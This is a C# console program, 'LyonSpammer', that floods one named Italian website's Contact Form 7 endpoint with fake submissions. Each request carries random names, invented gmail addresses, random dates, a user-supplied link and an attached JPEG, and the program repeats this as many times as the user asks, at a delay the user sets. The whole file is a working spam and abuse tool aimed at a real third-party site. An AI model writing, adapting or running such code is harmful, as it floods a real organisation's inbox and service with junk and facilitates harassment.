using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using Newtonsoft.Json;
using System.Diagnostics;

namespace LyonSpammer
{
    internal class Program
    {
        private static int messageSent = 0;
        private static int taskStarted = 0;
        private static Random random = new Random();
        private static byte[] imgBytes = File.ReadAllBytes(Environment.CurrentDirectory + @"\ShibaOnTop.jpg");
        private static string link = "https://github.com/CabboShiba";
        private static int total = 0;
        static async Task Main(string[] args)
        {
            Console.Title = $"[{DateTime.Now}] LyonSpammer by https://github.com/CabboShiba";
            Log("Insert your Message Link: ", "INFO", ConsoleColor.Yellow);
            string tmp = Console.ReadLine();
            if(tmp.Length > 0)
            {
                link = tmp;
            }
            Log("Your Link: " + link, "INFO", ConsoleColor.Yellow);
            Log("Delay [MS]? ", "INFO", ConsoleColor.Yellow);
            int delay = int.Parse(Console.ReadLine());
            Log("How many messages do you want to send? ", "INFO", ConsoleColor.Yellow);
            total = int.Parse(Console.ReadLine());
            Log("Starting...", "INFO", ConsoleColor.Yellow);
            for (int i = 0; i < total; i++)
            {
                await Task.Run(() =>
                {
                    _ = sendMessage(); 
                });
                await Task.Delay(delay);
            }
            Console.ReadLine();
            Process.GetCurrentProcess().Kill();
        }
        public static async Task sendMessage()
        {
            HttpClient httpClient = new HttpClient();
            MultipartFormDataContent content = new MultipartFormDataContent();
            ByteArrayContent byteContent = new ByteArrayContent(imgBytes);
            content.Add(new StringContent("8853"), "_wpcf7");
            content.Add(new StringContent("5.7.7"), "_wpcf7_version");
            content.Add(new StringContent("en_US"), "_wpcf7_locale");
            content.Add(new StringContent("wpcf7-f8853-o1"), "_wpcf7_unit_tag");
            content.Add(new StringContent("0"), "_wpcf7_container_post");
            content.Add(new StringContent(""), "_wpcf7_posted_data_hash");
            content.Add(new StringContent($"{RandomString(random.Next(5, 12))}"), "nome");
            content.Add(new StringContent($"{RandomString(random.Next(5, 12))}"), "cognome");
            content.Add(new StringContent($"{RandomString(random.Next(6, 12))}@gmail.com"), "your-email");
            content.Add(new StringContent($"{random.Next(1, 25)}/{random.Next(1, 12)}/{random.Next(2001, 2006)}"), "data");
            content.Add(new StringContent(link), "testo");
            content.Add(byteContent, $"{RandomString(random.Next(1, 16))}.jpg", "allega-doc");
            content.Add(new StringContent("Ho preso visione della Privacy Policy"), "accetto-privacy[]");
            HttpResponseMessage response = await httpClient.PostAsync("https://lyonwgf.it/wp-json/contact-form-7/v1/contact-forms/8853/feedback", content);
            if (response.StatusCode == HttpStatusCode.OK)
            {
                try
                {
                    Root res = JsonConvert.DeserializeObject<Root>(response.Content.ReadAsStringAsync().Result);
                    if (res.status == "mail_sent")
                    {
                        Log("E-Mail sent.", "SUCCESS", ConsoleColor.Green);
                        messageSent++;
                    }
                    else
                    {
                        Log("Could not send E-Mail: " + res.status, "FAIL", ConsoleColor.Red);
                    }
                }
                catch (Exception ex)
                {
                    Log("Response error: " + response.Content.ReadAsStringAsync().Result, "ERROR", ConsoleColor.Red);
                }
            }
            else
            {
                Log("Request failed: " + response.StatusCode, "ERROR", ConsoleColor.Red);
            }
            taskStarted++;
            Console.Title = $"Total task started: {taskStarted} | Total message sent: {messageSent} | Total requests failed: {taskStarted-messageSent} | Remaining task: {total-taskStarted}";
        }
        public static string RandomString(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        public static void Log(string Data, string Type, ConsoleColor Color)
        {
            Console.ForegroundColor = Color;
            Console.WriteLine($"[{DateTime.Now.ToString("HH:mm:ss")} - {Type}] {Data}");
            Console.ResetColor();
        }
        private class Root
        {
            public int contact_form_id { get; set; }
            public string status { get; set; }
            public string message { get; set; }
            public string posted_data_hash { get; set; }
            public string into { get; set; }
            public List<object> invalid_fields { get; set; }
        }

    }
}
